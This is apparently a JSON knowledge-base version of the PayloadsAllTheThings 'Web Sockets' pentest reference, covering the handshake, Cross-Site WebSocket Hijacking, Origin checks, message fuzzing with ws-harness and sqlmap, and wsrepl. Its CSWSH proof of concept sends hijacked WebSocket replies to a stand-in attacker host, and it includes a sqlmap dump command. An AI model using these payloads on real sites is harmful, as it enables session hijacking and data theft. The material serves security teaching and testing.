@@ -1,0 +1,194 @@
+{
+  "category": "Web Sockets",
+  "source": "PayloadsAllTheThings/Web Sockets/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What a WebSocket is and where to look for bugs",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "WebSocket is a full-duplex channel over a single long-lived TCP connection: real-time two-way exchange between the browser and the server.\n\nTypical uses: chats, online games, push notifications, exchange/trading platforms - anywhere frequent low-latency updates are needed.\n\nWhat to check during a pentest:\n• is the handshake protected by a CSRF token/nonce -> if not, CSWSH is possible (see below).\n• does the server check the Origin header on upgrade.\n• is data from WS messages sanitized (XSS on output, SQLi when it lands in a query).\n• can messages be tampered with/replayed and the handshake itself be manipulated."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "WebSocket protocol - handshake (Upgrade)",
+      "language": "text",
+      "tags": ["methodology", "protocol", "handshake"],
+      "body": "WebSocket starts as a regular HTTP/1.1 request and then upgrades the connection to the WebSocket protocol.\n\nThe client sends a special HTTP request with headers indicating the desire to switch the protocol; the server replies with 101 Switching Protocols. If the server accepts the request, two-way frame exchange per RFC 6455 follows."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Client request - Upgrade to WebSocket",
+      "language": "http",
+      "tags": ["protocol", "handshake", "request"],
+      "body": "GET /chat HTTP/1.1\nHost: example.com:80\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13"
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Server response - 101 Switching Protocols",
+      "language": "http",
+      "tags": ["protocol", "handshake", "response"],
+      "body": "HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "SocketIO",
+      "language": "text",
+      "tags": ["methodology", "socketio"],
+      "body": "Socket.IO is a JavaScript library (client and server) that provides a higher-level abstraction over WebSocket. The goal is to simplify real-time exchange and make it more reliable across different browsers and environments.\n\nIn practice, on top of Socket.IO there is its own CSWSH specificity (see the reference \"Cross Site WebSocket Hijacking with socketio\")."
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "Cross-Site WebSocket Hijacking - the essence",
+      "language": "text",
+      "tags": ["cswsh", "hijacking", "csrf"],
+      "body": "If the WebSocket handshake is not protected by a CSRF token or nonce, an attacker can use the victim's authenticated WebSocket from their own controlled site - because the browser supplies cookies automatically. This attack is called Cross-Site WebSocket Hijacking (CSWSH).\n\nIn essence it is CSRF at the upgrade stage: the only protection the server relies on (the cookie session) is under the attacker's control, and Origin is not checked. As a result, a connection on behalf of the victim is opened from the attacker's page, and the server's responses are exfiltrated outward."
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "PoC - exfiltrating data from a WebSocket to the attacker's server",
+      "language": "html",
+      "tags": ["cswsh", "poc", "exfiltration"],
+      "body": "<script>\n  ws = new WebSocket('wss://vulnerable.example.com/messages');\n  ws.onopen = function start(event) {\n    ws.send(\"HELLO\");\n  }\n  ws.onmessage = function handleReply(event) {\n    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});\n  }\n  ws.send(\"Some text sent to the server\");\n</script>"
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "Tailoring the PoC to Sec-WebSocket-Protocol",
+      "language": "text",
+      "tags": ["cswsh", "poc", "tip"],
+      "body": "The PoC code needs to be tailored to the specific situation. For example, if the application uses the Sec-WebSocket-Protocol header in the handshake request - add that value as the second parameter in the new WebSocket(...) call so that the header is set:\n\nnew WebSocket('wss://vulnerable.example.com/messages', 'protocol-value')"
+    },
+    {
+      "subcategory": "Missing Origin check",
+      "title": "Why CSWSH works at all - Origin is not checked",
+      "language": "text",
+      "tags": ["cswsh", "origin", "methodology"],
+      "body": "The root of CSWSH is that, on upgrade, the server does not validate the Origin header and trusts the cookie session alone.\n\nHow to check:\n• intercept the handshake request (Burp) and replace the Origin header with another domain - if the server still replies with 101 Switching Protocols and the connection works, there is no Origin check.\n• if at the same time only a cookie is used for authentication and there is no unique unpredictable token in the handshake - the vulnerability is confirmed.\n\nServer-side protection: check Origin against an allow-list and/or require a CSRF token/nonce in the handshake."
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "Manipulating WebSocket messages and the handshake",
+      "language": "text",
+      "tags": ["methodology", "manipulation", "injection"],
+      "body": "After the connection is established, data travels as messages (frames). If the application trusts the contents of the messages, classic injections pass through them:\n• tamper with/replay messages in Burp (the WebSockets tab) or via wsrepl.\n• insert a payload into the message body: XSS (if the server later renders the value in the DOM for another user), SQLi/NoSQLi/command injection (if the value ends up in a query/command on the backend).\n• separately attack the handshake itself: spoofing headers (Origin, Sec-WebSocket-Protocol, custom auth headers), cookie/token values in the Upgrade request.\n\nThe idea is simple: WebSocket is just one more input channel, treat every message field as untrusted."
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness - fuzzing WS messages with ordinary tools",
+      "language": "text",
+      "tags": ["manipulation", "ws-harness", "fuzzing"],
+      "body": "ws-harness brings up a local HTTP proxy server in front of the WebSocket endpoint and on the fly substitutes input into the message template. This lets you point traditional tools (sqlmap, Burp Intruder, etc.) at the WebSocket.\n\nStart ws-harness listening to the WebSocket and point it at a template file of the message that will be sent to the endpoint. In the template the keyword [FUZZ] marks the injection point - the value from the ?fuzz= parameter of the incoming HTTP request is substituted there."
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness - launch (proxy in front of the WebSocket)",
+      "language": "text",
+      "tags": ["ws-harness", "tools", "command"],
+      "body": "python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt"
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness - message template with [FUZZ]",
+      "language": "text",
+      "tags": ["ws-harness", "fuzzing", "template"],
+      "body": "{\n    \"auth_user\":\"dGVzda==\",\n    \"auth_pass\":\"[FUZZ]\"\n}"
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness + sqlmap - SQLi via WebSocket",
+      "language": "text",
+      "tags": ["ws-harness", "sqlmap", "sqli"],
+      "body": "sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump"
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness.py - source",
+      "language": "python",
+      "tags": ["ws-harness", "tools", "source"],
+      "body": "#!/usr/bin/python\nfrom __future__ import print_function\nimport socket,ssl\nfrom BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer\nfrom websocket import create_connection, WebSocket\nfrom urlparse import parse_qs\nimport argparse\nimport os\n\nLOOP_BACK_PORT_NUMBER = 8000\n\ndef FuzzWebSocket(fuzz_value):\n    print(fuzz_value)\n    ws.send(ws_message.replace(\"[FUZZ]\", str(fuzz_value[0])))\n    result =  ws.recv()\n    return result\n\ndef LoadMessage(file):\n    file_contents = \"\"\n    try:\n        if os.path.isfile(file):\n            f = open(file,'r')\n            file_contents = f.read()\n            f.close()\n    except:\n        print(\"Error reading file: %s\" % file)\n        exit()\n    return file_contents\n\nclass myWebServer(BaseHTTPRequestHandler):\n    \n    #Handler for the GET requests\n    def do_GET(self):\n        qs = parse_qs(self.path[2:])\n        fuzz_value = qs['fuzz']\n        result = FuzzWebSocket(fuzz_value)\n        self.send_response(200)\n        self.send_header('Content-type','text/html')\n        self.end_headers()\n        self.wfile.write(result)\n        return\n\nparser = argparse.ArgumentParser(description='Web Socket Harness: Use traditional tools to assess web sockets')\nparser.add_argument('-u','--url', help='The remote WebSocket URL to target.',required=True)\nparser.add_argument('-m','--message', help='A file that contains the WebSocket message template to send. Please place [FUZZ] where injection is desired.',required=True)\nargs = parser.parse_args()\n\nws_message = LoadMessage(args.message)\n\nws = create_connection(args.url,sslopt={\"cert_reqs\": ssl.CERT_NONE},header={},http_proxy_host=\"\", http_proxy_port=8080)\n\ntry:\n    #Create a web server and define the handler to manage the\n    #incoming request\n    server = HTTPServer(('', LOOP_BACK_PORT_NUMBER), myWebServer)\n    print('Started httpserver on port ' , LOOP_BACK_PORT_NUMBER)\n    \n    #Wait forever for incoming http requests\n    server.serve_forever()\n\nexcept KeyboardInterrupt:\n    print('^C received, shutting down the web server')\n    server.socket.close()\n    ws.close()"
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "Diagram: SQLMap -> ws-harness -> target WebSocket",
+      "language": "image",
+      "tags": ["ws-harness", "sqlmap", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/WebsocketHarness.jpg",
+        "caption": "Data flow: SQLMap sends an HTTP GET request to the Loopback Web Server (ws-harness), which forwards it as a WebSocket Request to the target endpoint; the WebSocket Response comes back and is returned to SQLMap as an HTTP GET Response. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "ws-harness - starting the local server",
+      "language": "image",
+      "tags": ["ws-harness", "screenshot"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/websocket-harness-start.png",
+        "caption": "Running python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt - an httpserver came up on port 8000. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Message manipulation",
+      "title": "sqlmap detects injection via ws-harness",
+      "language": "image",
+      "tags": ["sqlmap", "sqli", "screenshot"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/sqlmap.png",
+        "caption": "sqlmap against http://127.0.0.1:8000/?fuzz=test with --tamper=base64encode: the heuristic shows that the fuzz parameter may be injectable (possible DBMS MySQL) and vulnerable to XSS. This is how classic tools work over WebSocket via ws-harness. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools for WebSocket pentesting",
+      "language": "table",
+      "tags": ["tools", "wsrepl", "ws-harness"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Tool", "Purpose"],
+          "rows": [
+            ["doyensec/wsrepl", "WebSocket REPL for pentesters (interactive + automation via plugins)"],
+            ["mfowl/ws-harness.py", "Proxy harness: point ordinary tools (sqlmap, Intruder) at a WebSocket via [FUZZ]"],
+            ["PortSwigger/websocket-turbo-intruder", "Fuzzing WebSocket with custom Python code"],
+            ["snyk/socketsleuth", "A Burp extension with extra features for pentesting WebSocket applications"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Tools",
+      "title": "wsrepl - purpose and installation",
+      "language": "text",
+      "tags": ["wsrepl", "tools", "repl"],
+      "body": "wsrepl (Doyensec) simplifies auditing WebSocket applications: an interactive REPL, convenient and easy to automate. Built on the Python TUI framework Textual and compatible with curl arguments - it is easy to move from an Upgrade request in Burp to wsrepl. It gives full transparency of WebSocket opcodes per RFC 6455 and auto-reconnect on drops.\n\nInstallation and launch:\npip install wsrepl\nwsrepl -u URL -P auth_plugin.py"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "wsrepl - plugin (lifecycle hooks)",
+      "language": "python",
+      "tags": ["wsrepl", "plugin", "automation"],
+      "body": "from wsrepl import Plugin\nfrom wsrepl.WSMessage import WSMessage\n\nimport json\nimport requests\n\nclass Demo(Plugin):\n    def init(self):\n        token = requests.get(\"https://example.com/uuid\").json()[\"uuid\"]\n        self.messages = [\n            json.dumps({\n                \"auth\": \"session\",\n                \"sessionId\": token\n            })\n        ]\n\n    async def on_message_sent(self, message: WSMessage) -> None:\n        original = message.msg\n        message.msg = json.dumps({\n            \"type\": \"message\",\n            \"data\": {\n                \"text\": original\n            }\n        })\n        message.short = original\n        message.long = message.msg\n\n    async def on_message_received(self, message: WSMessage) -> None:\n        original = message.msg\n        try:\n            message.short = json.loads(original)[\"data\"][\"text\"]\n        except:\n            message.short = \"Error: could not parse message\"\n\n        message.long = original"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "wsrepl - about plugins",
+      "language": "text",
+      "tags": ["wsrepl", "plugin", "tip"],
+      "body": "To move on to WebSocket automation, it is enough to write a Python plugin. The plugin system is flexible: you can define hooks that run at different stages of the WebSocket lifecycle (init, on_message_sent, on_message_received, ...)."
+    },
+    {
+      "subcategory": "Labs",
+      "title": "Practice - WebSocket labs",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• PortSwigger - Manipulating WebSocket messages to exploit vulnerabilities\n• PortSwigger - Cross-site WebSocket hijacking\n• PortSwigger - Manipulating the WebSocket handshake to exploit vulnerabilities\n• Root Me - Web Socket - 0 protection"
+    }
+  ]
+}
